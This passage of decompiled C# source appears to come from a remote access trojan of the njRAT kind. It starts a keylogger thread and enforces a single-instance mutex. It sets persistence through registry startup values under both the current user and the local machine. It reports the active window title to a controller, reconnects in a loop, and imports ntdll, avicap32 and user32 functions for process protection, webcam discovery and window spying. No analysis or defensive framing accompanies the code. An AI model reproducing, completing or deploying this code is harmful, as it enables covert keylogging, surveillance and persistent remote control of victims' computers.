								NewLateBinding.LateCall(CurrentPlugin, null, "clear", new object[0], null, null, null, true);
								CurrentPlugin = null;
							}
						}
						catch (Exception expr_1EC)
						{
							ProjectData.SetProjectError(expr_1EC);
							ProjectData.ClearProjectError();
						}
						IsConnected = false;
					}
					while (!Connect());
					IsConnected = true;
				}
			}
		}

		public static void Start()
		{
			if (Interaction.Command() != null)
			{
				try
				{
					_Computer.Registry.CurrentUser.SetValue("di", "!");
				}
				catch (Exception expr_27)
				{
					ProjectData.SetProjectError(expr_27);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			bool flag = false;
			StubMutex = new Mutex(true, RG, out flag);
			if (!flag)
			{
				ProjectData.EndApp();
			}
			Install();
			if (!Idr)
			{
				StubName = CurrentAssemblyFileInfo.Name;
				DropFolder = CurrentAssemblyFileInfo.Directory.Name;
			}
			Thread thread = new Thread(new ThreadStart(Receive), 1);
			thread.Start();
			try
			{
				_Keylogger = new Keylogger();
				thread = new Thread(new ThreadStart(_Keylogger.WRK), 1);
				thread.Start();
			}
			catch (Exception expr_CE)
			{
				ProjectData.SetProjectError(expr_CE);
				ProjectData.ClearProjectError();
			}
			int num = 0;
			string left = "";
			if (BD)
			{
				try
				{
					SystemEvents.SessionEnding += delegate(object a0, SessionEndingEventArgs a1)
					{
						ED();
					};
					pr(1);
				}
				catch (Exception expr_105)
				{
					ProjectData.SetProjectError(expr_105);
					ProjectData.ClearProjectError();
				}
			}
			checked
			{
				while (true)
				{
					Thread.Sleep(1000);
					if (!IsConnected)
					{
						left = "";
					}
					Application.DoEvents();
					try
					{
						num++;
						if (num == 5)
						{
							try
							{
								Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
							}
							catch (Exception expr_14E)
							{
								ProjectData.SetProjectError(expr_14E);
								ProjectData.ClearProjectError();
							}
						}
						if (num >= 8)
						{
							num = 0;
							string text = GetForegroundWindowTitle();
							if (Operators.CompareString(left, text, false) != 0)
							{
								left = text;
								Send("act" + Splitter + text);
							}
						}
						if (Isu)
						{
							try
							{
								if (Operators.ConditionalCompareObjectNotEqual(_Computer.Registry.CurrentUser.GetValue(sf + "\\" + RG, ""), "\"" + CurrentAssemblyFileInfo.FullName + "\" ..", false))
								{
									_Computer.Registry.CurrentUser.OpenSubKey(sf, true).SetValue(RG, "\"" + CurrentAssemblyFileInfo.FullName + "\" ..");
								}
							}
							catch (Exception expr_227)
							{
								ProjectData.SetProjectError(expr_227);
								ProjectData.ClearProjectError();
							}
							try
							{
								if (Operators.ConditionalCompareObjectNotEqual(_Computer.Registry.LocalMachine.GetValue(sf + "\\" + RG, ""), "\"" + CurrentAssemblyFileInfo.FullName + "\" ..", false))
								{
									_Computer.Registry.LocalMachine.OpenSubKey(sf, true).SetValue(RG, "\"" + CurrentAssemblyFileInfo.FullName + "\" ..");
								}
							}
							catch (Exception expr_2C3)
							{
								ProjectData.SetProjectError(expr_2C3);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception expr_2D4)
					{
						ProjectData.SetProjectError(expr_2D4);
						ProjectData.ClearProjectError();
					}
				}
			}
		}

		private static void _Lambda(object a0)
		{
			HandleData((byte[])a0);
		}

		private static void _Lambda(object a0, SessionEndingEventArgs a1)
		{
			ED();
		}

        [DllImport("ntdll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

        [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
        private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
        public static extern int GetWindowTextLength(long hwnd);      
	}
}
